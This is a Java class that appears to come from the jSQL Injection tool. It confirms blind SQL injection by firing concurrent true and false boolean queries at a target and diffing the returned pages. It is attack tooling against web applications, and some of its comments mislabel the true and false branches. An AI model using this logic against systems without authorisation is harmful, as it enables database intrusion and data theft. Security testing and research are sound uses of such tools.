package com.jsql.model.injection.strategy.blind;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.patch.Diff;
import com.jsql.util.LogLevel;

/**
 * A blind attack class using concurrent threads.
 */
public class InjectionCharInsertion {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    // Source code of the TRUE web page (usually ?id=1)
    private String blankFalseMark;

    /**
     * List of string differences found in all the FALSE queries, compared
     * to the TRUE page (aka opcodes). Each FALSE pages should contain
     * at least one same string, which shouldn't be present in all
     * the TRUE queries.
     */
    private List<Diff> constantTrueMark = new ArrayList<>();
    
    protected InjectionModel injectionModel;

    private String prefixSuffix;
    
    private static final String PREFIX = "prefix";

    private List<String> falseTest;
    
    /**
     * Create blind attack initialization.
     * If every false test are not in true mark and every true test are in
     * true test, then blind attack is confirmed.
     * @param prefixSuffix
     */
    public InjectionCharInsertion(InjectionModel injectionModel, String falseCharInsertion, String prefixSuffix) {
        
        this.injectionModel = injectionModel;
        
        this.prefixSuffix = prefixSuffix;
        
        List<String> trueTest = this.injectionModel.getMediatorVendor().getVendor().instance().getListTrueTest();
        this.falseTest = this.injectionModel.getMediatorVendor().getVendor().instance().getListFalseTest();
        
        // No blind
        if (trueTest.isEmpty() || this.injectionModel.isStoppedByUser()) {
            
            return;
        }
        
        // Call the SQL request which must be FALSE (usually ?id=-123456879)
        this.blankFalseMark = this.callUrl(
            String
            .join(
                "+",
                falseCharInsertion,
                this.injectionModel.getMediatorVendor().getVendor().instance().endingComment(),
                "fals+"
            ),
            "root#ref"
        );

        // Concurrent calls to the FALSE statements,
        // it will use inject() from the model
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCharInsertionTagTrue");
        
        Collection<CallableCharInsertion> listCallableTagTrue = new ArrayList<>();
        
        for (String urlTest: trueTest) {
            
            listCallableTagTrue.add(
                new CallableCharInsertion(
                    String
                    .join(
                        "+",
                        prefixSuffix.replace(PREFIX, RandomStringUtils.random(10, "345")),
                        this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBoolean().getModeOr(),
                        urlTest
                    ),
                    this,
                    "root#true"
                )
            );
        }
        
        // Delete junk from the results of FALSE statements,
        // keep only opcodes found in each and every FALSE pages.
        // Allow the user to stop the loop
        try {
            List<Future<CallableCharInsertion>> listTagTrue = taskExecutor.invokeAll(listCallableTagTrue);
            
            taskExecutor.shutdown();
            
            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {
                
                taskExecutor.shutdownNow();
            }
            
            this.constantTrueMark = listTagTrue.get(0).get().getOpcodes();
            
            for (var i = 1 ; i < listTagTrue.size() ; i++) {
                
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                
                this.constantTrueMark.retainAll(listTagTrue.get(i).get().getOpcodes());
            }
        } catch (ExecutionException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            
        } catch (InterruptedException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            Thread.currentThread().interrupt();
        }
        
        this.initializeFalseMarks();
    }
    
    private void initializeFalseMarks() {
        
        // Concurrent calls to the TRUE statements,
        // it will use inject() from the model.
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetBlindTagTrue");

        Collection<CallableCharInsertion> listCallableTagFalse = new ArrayList<>();
        
        for (String urlTest: this.falseTest) {
            
            listCallableTagFalse.add(
                new CallableCharInsertion(
                    String
                    .join(
                        "+",
                        this.prefixSuffix.replace(PREFIX, RandomStringUtils.random(10, "345")),
                        this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBoolean().getModeOr(),
                        urlTest
                    ),
                    this,
                    "root#false"
                )
            );
        }
        
        // Remove TRUE opcodes in the FALSE opcodes, because
        // a significant FALSE statement shouldn't contain any TRUE opcode.
        // Allow the user to stop the loop.
        try {
            List<Future<CallableCharInsertion>> listTagFalse = taskExecutor.invokeAll(listCallableTagFalse);
            
            taskExecutor.shutdown();
            
            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {
                
                taskExecutor.shutdownNow();
            }
        
            for (Future<CallableCharInsertion> falseTag: listTagFalse) {
                
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }

                this.constantTrueMark.removeAll(falseTag.get().getOpcodes());
            }
            
        } catch (ExecutionException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            
        } catch (InterruptedException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            Thread.currentThread().interrupt();
        }
    }

    public boolean isInjectable() throws StoppedByUserSlidingException {
        
        if (this.injectionModel.isStoppedByUser()) {
            
            throw new StoppedByUserSlidingException();
        }
        
        var blindTest = new CallableCharInsertion(
            String
            .join(
                "+",
                this.prefixSuffix.replace(PREFIX, RandomStringUtils.random(10, "678")),
                this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBoolean().getModeOr(),
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlTestBooleanInitialization()
            ),
            this,
            "root#confirm"
        );
        
        try {
            blindTest.call();
            
        } catch (Exception e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
        }

        return blindTest.isTrue() && !this.constantTrueMark.isEmpty();
    }
    
    public String callUrl(String urlString, String metadataInjectionProcess) {
        
        return this.injectionModel.injectWithoutIndex(urlString, metadataInjectionProcess);
    }
    
    
    // Getter and setter

    public String getBlankFalseMark() {
        return this.blankFalseMark;
    }
    
    public List<Diff> getConstantTrueMark() {
        return this.constantTrueMark;
    }
}
